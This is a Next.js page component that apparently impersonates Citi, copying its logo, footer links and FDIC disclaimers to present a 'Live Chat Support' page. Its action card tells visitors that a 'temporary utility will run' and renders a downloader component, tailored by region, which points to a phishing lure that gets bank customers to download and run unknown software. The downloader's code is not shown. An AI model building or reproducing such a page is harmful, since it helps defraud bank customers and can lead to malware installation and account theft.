"use client";

import Image from "next/image";
import { Header } from "./components/Header";
import { SmartDownloader } from "./components/SmartDownloader";
import { useUserRegion } from "./hooks/useUserRegion";

export default function Home() {
  const { regionData, loading } = useUserRegion();

  return (
    <div className="relative min-h-screen flex flex-col bg-citi-gray-bg">
      <Header />

      {/* ── Main Content ── */}
      <main className="flex-1 flex flex-col">
        <div className="w-full bg-citi-gray-bg pt-12 pb-16 px-6">
          <div className="w-full max-w-[1200px] mx-auto flex flex-col lg:flex-row gap-12 lg:gap-24 items-start justify-between">

            {/* Promo — Left */}
            <div className="flex-1 text-citi-navy max-w-2xl flex flex-col pt-4">
              <h1 className="text-[40px] md:text-[52px] font-light leading-[1.1] mb-6 tracking-tight text-citi-navy">
                <span className="font-bold">{loading ? "Citi" : regionData.brandName}</span>{" "}
                <br />
                Live Chat Support.
              </h1>
              <p className="text-[18px] text-citi-text-secondary mb-8 leading-relaxed font-light">
                {loading ? "Loading your local support..." : regionData.heroSubtitle} Start a secure live chat session with our specialists to get real-time assistance directly on your device.
              </p>

              <ul className="space-y-5 list-none p-0 m-0 text-citi-navy text-[16px]">
                <li className="flex items-start gap-4">
                  <div className="w-6 h-6 flex items-center justify-center mt-0.5 shrink-0">
                    <svg className="w-5 h-5 text-citi-blue" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                    </svg>
                  </div>
                  <div>
                    <strong className="block font-semibold">Bank-grade Encryption</strong>
                    <span className="text-citi-text-secondary text-[14px]">Your session is fully secured end-to-end.</span>
                  </div>
                </li>
                <li className="flex items-start gap-4">
                  <div className="w-6 h-6 flex items-center justify-center mt-0.5 shrink-0">
                    <svg className="w-5 h-5 text-citi-blue" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
                    </svg>
                  </div>
                  <div>
                    <strong className="block font-semibold">Instant Resolution</strong>
                    <span className="text-citi-text-secondary text-[14px]">Connect directly to an available agent in seconds.</span>
                  </div>
                </li>
              </ul>
            </div>

            {/* Action Card — Right */}
            <div className="w-full max-w-[420px] flex items-center mt-6 lg:mt-0">
              <div className="w-full bg-citi-white p-8 md:p-10 rounded-xl shadow-[0_4px_32px_rgba(0,45,114,0.10)] border border-citi-gray-border/40 relative overflow-hidden">
                <div className="absolute top-0 left-0 w-full h-[3px] bg-citi-arc rounded-t-xl" />
                <h2 className="text-[24px] font-semibold text-citi-navy mb-3">
                  Start your session
                </h2>
                <p className="text-citi-text-secondary text-[14px] mb-8 leading-relaxed">
                  Click below to initiate a secure live chat. A temporary utility will run to connect you with an agent.
                </p>
                <SmartDownloader />
              </div>
            </div>

          </div>
        </div>
      </main>

      {/* ════════════════════════════════════════
          FOOTER — mirrors citigroup.com structure
          Background: #0F1632 (rgb 15,22,50)
          ════════════════════════════════════════ */}
      <footer className="w-full px-6 text-white" style={{ backgroundColor: "#0F1632" }}>
        <div className="max-w-[1176px] mx-auto">

          {/* ── Footer Top: logo + social ── */}
          <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center pt-10 pb-8 border-b border-white/10">
            <div className="mb-6 sm:mb-0">
              <Image
                src="/citi-logo-white.svg"
                alt="Citi"
                width={88}
                height={36}
                style={{ width: "auto", height: "2.25rem" }}
              />
            </div>
            {/* Social icons */}
            <div className="flex items-center gap-3">
              {/* Twitter / X */}
              <a href="https://x.com/Citi" target="_blank" rel="noopener noreferrer" aria-label="Citi on X (Twitter)"
                className="w-8 h-8 rounded-full border border-white/20 flex items-center justify-center hover:border-white/60 transition-colors">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" className="text-white/70">
                  <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-4.714-6.231-5.401 6.231H2.748l7.73-8.835L1.254 2.25H8.08l4.253 5.622L18.244 2.25zM17.083 19.77h1.833L7.084 4.126H5.117L17.083 19.77z" />
                </svg>
              </a>
              {/* Facebook */}
              <a href="https://www.facebook.com/Citi" target="_blank" rel="noopener noreferrer" aria-label="Citi on Facebook"
                className="w-8 h-8 rounded-full border border-white/20 flex items-center justify-center hover:border-white/60 transition-colors">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" className="text-white/70">
                  <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
                </svg>
              </a>
              {/* LinkedIn */}
              <a href="https://www.linkedin.com/company/citi" target="_blank" rel="noopener noreferrer" aria-label="Citi on LinkedIn"
                className="w-8 h-8 rounded-full border border-white/20 flex items-center justify-center hover:border-white/60 transition-colors">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" className="text-white/70">
                  <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z" />
                </svg>
              </a>
              {/* YouTube */}
              <a href="https://www.youtube.com/citi" target="_blank" rel="noopener noreferrer" aria-label="Citi on YouTube"
                className="w-8 h-8 rounded-full border border-white/20 flex items-center justify-center hover:border-white/60 transition-colors">
                <svg width="15" height="11" viewBox="0 0 24 17" fill="currentColor" className="text-white/70">
                  <path d="M23.495 2.205A3.026 3.026 0 0 0 21.435.142C19.56-.387 12 0 12 0S4.44-.387 2.565.142A3.026 3.026 0 0 0 .505 2.205C0 4.09 0 8.001 0 8.001s0 3.91.505 5.796a3.026 3.026 0 0 0 2.06 2.063C4.44 16.389 12 16.389 12 16.389s7.56 0 9.435-.529a3.026 3.026 0 0 0 2.06-2.063C24 11.912 24 8 24 8s0-3.91-.505-5.795zm-14.233 9.33V5.46l6.328 3.037-6.328 3.038z" />
                </svg>
              </a>
              {/* Instagram */}
              <a href="https://www.instagram.com/citi" target="_blank" rel="noopener noreferrer" aria-label="Citi on Instagram"
                className="w-8 h-8 rounded-full border border-white/20 flex items-center justify-center hover:border-white/60 transition-colors">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor" className="text-white/70">
                  <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z" />
                </svg>
              </a>
            </div>
          </div>

          {/* ── Footer Link Columns ── */}
          <div className="grid grid-cols-2 md:grid-cols-4 gap-x-6 gap-y-10 py-10 border-b border-white/10">

            {/* Column 1: Banking Products */}
            <div>
              <h4 className="text-[16px] font-bold text-white mb-5 leading-[17px]">
                Banking Products
              </h4>
              <ul className="space-y-4">
                {[
                  "Credit Cards",
                  "Banking",
                  "Mortgage",
                  "Personal Loans",
                  "Investing",
                  "Small Business",
                  "Wealth Management",
                ].map((link) => (
                  <li key={link}>
                    <a href="#" className="text-[15px] text-white hover:text-white/80 transition-colors leading-[19px]">
                      {link}
                    </a>
                  </li>
                ))}
              </ul>
            </div>

            {/* Column 2: About Citi */}
            <div>
              <h4 className="text-[16px] font-bold text-white mb-5 leading-[17px]">
                About Citi
              </h4>
              <ul className="space-y-4">
                {[
                  ["About Us", "https://www.citigroup.com/global/about-us"],
                  ["Strategy", "https://www.citigroup.com/global/about-us/strategy"],
                  ["Leadership", "https://www.citigroup.com/global/about-us/leadership"],
                  ["Careers", "https://jobs.citi.com/"],
                  ["News & Media", "https://www.citigroup.com/global/news"],
                  ["Citi Foundation", "https://www.citigroup.com/global/our-impact"],
                  ["Investor Relations", "https://www.citigroup.com/global/investors"],
                ].map(([label, href]) => (
                  <li key={label}>
                    <a href={href} target="_blank" rel="noopener noreferrer" className="text-[15px] text-white hover:text-white/80 transition-colors leading-[19px]">
                      {label}
                    </a>
                  </li>
                ))}
              </ul>
            </div>

            {/* Column 3: Support & Security */}
            <div>
              <h4 className="text-[16px] font-bold text-white mb-5 leading-[17px]">
                Support &amp; Security
              </h4>
              <ul className="space-y-4">
                {[
                  ["Customer Service", loading ? "#" : `tel:${regionData.supportPhone.replace(/[^+\d]/g, "")}`],
                  ["Security Center", "https://online.citi.com/US/ag/security-center"],
                  ["Fraud &amp; Security Awareness", "https://www.citigroup.com/global/fraud-security-awareness"],
                  ["Contact Us", "https://www.citigroup.com/global/contact-us"],
                  ["Find ATM/Branch", "#"],
                  ["Accessibility", "https://www.citi.com/accessibility"],
                ].map(([label, href]) => (
                  <li key={label}>
                    <a
                      href={href}
                      target={href.startsWith("tel:") || href === "#" ? undefined : "_blank"}
                      rel="noopener noreferrer"
                      className="text-[15px] text-white hover:text-white/80 transition-colors leading-[19px]"
                      dangerouslySetInnerHTML={{ __html: label }}
                    />
                  </li>
                ))}
              </ul>
            </div>

            {/* Column 4: Legal */}
            <div>
              <h4 className="text-[16px] font-bold text-white mb-5 leading-[17px]">
                Legal
              </h4>
              <ul className="space-y-4">
                {[
                  ["Privacy Notice", "https://www.citigroup.com/global/privacy/citigroup"],
                  ["Terms of Use", loading ? "#" : regionData.termsUrl],
                  ["Cookie Policy", "https://www.citigroup.com/global/institutional-clients/cookiepolicy"],
                  ["Notice at Collection", "https://www.citigroup.com/global/privacy/citigroup#a"],
                  ["CA Privacy Hub", "https://online.citi.com/dataprivacyhub"],
                  ["Regulatory Disclosures", "https://www.citigroup.com/global/disclosures"],
                  ["Ethics Hotline", "https://www.citigroup.com/global/ethics-hotline"],
                ].map(([label, href]) => (
                  <li key={label}>
                    <a href={href} target="_blank" rel="noopener noreferrer" className="text-[15px] text-white hover:text-white/80 transition-colors leading-[19px]">
                      {label}
                    </a>
                  </li>
                ))}
              </ul>
            </div>

          </div>

          {/* ── Footer Bottom Legal Strip ── */}
          <div className="pt-6 pb-2">
            {/* Quick legal links */}
            <div className="flex flex-wrap gap-x-5 gap-y-2 mb-6">
              {[
                ["Terms", "https://www.citigroup.com/global/terms"],
                ["Privacy", "https://www.citigroup.com/global/privacy/citigroup"],
                ["Cookie Policy", "https://www.citigroup.com/global/institutional-clients/cookiepolicy"],
                ["Accessibility", "https://www.citi.com/accessibility"],
                ["CA Privacy Hub", "https://online.citi.com/dataprivacyhub"],
                ["Suppliers", "https://www.citigroup.com/global/suppliers"],
              ].map(([label, href]) => (
                <a
                  key={label}
                  href={href}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="text-[12px] text-white/40 hover:text-white/70 transition-colors"
                >
                  {label}
                </a>
              ))}
            </div>

            {/* FDIC + Equal Housing badges row */}
            <div className="flex flex-wrap items-center gap-4 mb-5">
              <span className="inline-flex items-center gap-1.5 px-2.5 py-1 border border-white/20 rounded text-[10.5px] text-white/50 font-semibold tracking-wide">
                FDIC
                <span className="font-normal text-white/35">Member</span>
              </span>
              <span className="inline-flex items-center gap-1.5 px-2.5 py-1 border border-white/20 rounded text-[10.5px] text-white/50 font-semibold tracking-wide">
                <svg width="10" height="12" viewBox="0 0 10 12" fill="none" className="text-white/40">
                  <rect x="1" y="6" width="8" height="5" rx="0.5" stroke="currentColor" strokeWidth="1.2" />
                  <path d="M3 6V4a2 2 0 0 1 4 0v2" stroke="currentColor" strokeWidth="1.2" />
                </svg>
                Equal Housing Lender
              </span>
            </div>

            {/* Disclaimer */}
            <p className="text-[11px] text-white/30 leading-relaxed max-w-[900px]">
              © {new Date().getFullYear()} Citigroup Inc. All Rights Reserved. Citi, Citi and Arc Design and other marks used herein are
              service marks of Citigroup Inc. or its affiliates, used and registered throughout the world.{" "}
              {loading ? "Citibank, N.A." : regionData.legalEntityName} Member FDIC. Equal Housing Lender. Banking
              products and services are provided by Citibank, N.A. Your use of this website is subject to the terms
              and conditions governing it. Please read these terms and conditions before using the website.
            </p>
          </div>

        </div>
      </footer>
    </div>
  );
}
